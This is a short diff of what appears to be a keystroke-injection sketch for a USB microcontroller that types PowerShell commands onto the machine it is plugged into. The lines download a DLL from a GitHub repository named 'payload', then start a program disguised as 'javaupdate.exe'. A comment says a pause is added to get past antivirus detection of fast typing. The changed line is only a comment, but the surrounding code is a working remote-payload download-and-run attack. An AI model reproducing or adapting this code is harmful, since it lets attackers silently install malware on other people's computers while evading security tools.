@@ -30,6 +30,7 @@ void setup() {
   fastType("Invoke-WebRequest 'INPUT RAW HTTPS LINK HERE' -OutFile ($s+'NAME')");
   //some AVs have a signature detection for very fast consecutive typing thus this code snippet BELOW can be used for avoiding it.
   fastType("Start-Sleep -Seconds 1");
+  // completely optional^^^^
   fastType("Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/libcurl-x64.dll' -OutFile ($s+'libcurl-x64.dll')");
   fastType("Start-Process ($s+'javaupdate.exe')");
 
